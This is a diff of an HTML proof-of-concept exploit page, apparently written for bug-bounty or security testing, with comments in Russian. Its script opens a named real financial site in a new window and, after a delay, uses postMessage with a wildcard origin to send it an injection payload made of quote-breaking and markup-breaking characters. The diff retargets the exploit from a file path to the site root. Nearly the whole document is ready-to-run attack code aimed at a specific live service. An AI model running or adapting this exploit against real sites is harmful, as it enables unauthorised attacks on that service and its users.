@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attacker Page</title>
+    <title>PoC: Exploiting postMessage Vulnerability</title>
 </head>
 <body>
     <h1>PoC: Exploiting postMessage Vulnerability</h1>
@@ -11,15 +11,15 @@
 
     <script>
         function exploit() {
-            // Открываем целевую страницу в новом окне
-            var targetWindow = window.open('https://web.koho.ca/.well-known/assetlinks.json');
+            // Открываем целевой сайт в новом окне
+            var targetWindow = window.open('https://web.koho.ca');
 
-            // Вредоносное сообщение
-            var payload = '{"key":"xrotx1nm93%2527%2522`\'\"/xrotx1nm93/><xrotx1nm93/\\>rfk4zqk4p0&"}';
+            // Определяем payload с инъекционными данными
+            var payload = `{ "key": "xrotx1nm93%2527%2522\`'\"/xrotx1nm93/><xrotx1nm93/\>rfk4zqk4p0&" }`;
 
-            // Отправка сообщения через 5 секунд после открытия страницы
+            // Отправляем payload через postMessage спустя 5 секунд после открытия сайта
             setTimeout(function() {
-                console.log("Sending payload...");
+                console.log("Sending payload to target site...");
                 targetWindow.postMessage(payload, '*');
             }, 5000);
         }
